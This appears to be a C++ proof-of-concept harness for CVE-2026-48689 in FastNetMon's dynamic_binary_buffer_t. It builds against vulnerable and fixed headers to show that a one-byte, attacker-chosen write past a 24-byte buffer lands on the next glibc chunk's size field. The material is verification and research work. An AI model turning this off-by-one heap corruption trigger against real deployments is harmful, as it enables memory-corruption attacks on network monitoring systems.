// Direct-call harness for CVE-2026-48689 (FastNetMon dynamic_binary_buffer_t).
// Builds against the pinned RAW header from upstream, vulnerable parent
// 97b04568b6f1 or fix commit fa80390ed446 -- no reimplementation of the class.
//
// Sequence:
//   1. allocate a 24-byte buffer (glibc: request 24 -> chunk usable size 24,
//      so index 24 is the low byte of the next chunk's size field);
//   2. fill indices 0..23 with append_byte() (that method has the CORRECT
//      bound check in both builds);
//   3. append ONE attacker-chosen byte at offset 24 via
//      append_data_as_pointer(): the vulnerable check
//      "24 + 1 > 24 + 1" is false and admits the write, the fixed check
//      "24 + 1 > 24" is true and rejects it.
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <type_traits>

#ifdef USE_FIXED
#include "dynamic_binary_buffer.fixed.hpp"
#else
#include "dynamic_binary_buffer.vuln.hpp"
#endif

int main(int argc, char** argv) {
    const ssize_t cap = 24;
    const uint8_t chosen = (argc > 1) ? (uint8_t)strtoul(argv[1], nullptr, 0) : 0x41;

    dynamic_binary_buffer_t b;
#ifdef USE_FIXED
    const bool alloc = b.set_buffer_size_in_bytes(cap);
#else
    const bool alloc = b.set_maximum_buffer_size_in_bytes(cap);
#endif
    if (!alloc) {
        std::printf("alloc-failed\n");
        return 2;
    }

    for (ssize_t i = 0; i < cap; ++i) {
        if (!b.append_byte((uint8_t)(0x41 + (i & 3)))) {
            std::printf("fill-failed at %zd\n", i);
            return 3;
        }
    }
    if (b.get_used_size() != (size_t)cap) {
        std::printf("shift-bad %zu\n", b.get_used_size());
        return 4;
    }

    std::printf("PRE cap=%zd shift=%zu chosen=0x%02x\n", cap, b.get_used_size(), chosen);
    std::fflush(stdout);

    const bool accepted = b.append_data_as_pointer(&chosen, 1);

    std::printf("POST accepted=%d failed_flag=%d shift=%zu\n",
                accepted ? 1 : 0, b.is_failed() ? 1 : 0, b.get_used_size());
#ifndef __SANITIZE_ADDRESS__
    // Plain build only: reading p[cap] under ASan would itself be an OOB read
    // and would pollute the fixed-build control with a harness artifact.
    const uint8_t* p = b.get_pointer();
    std::printf("READBACK byte[cap]=0x%02x expected=0x%02x\n", p[cap], chosen);
#else
    std::printf("READBACK skipped under ASan (would itself be OOB)\n");
#endif
    std::fflush(stdout);
    return accepted ? 0 : 1;
}
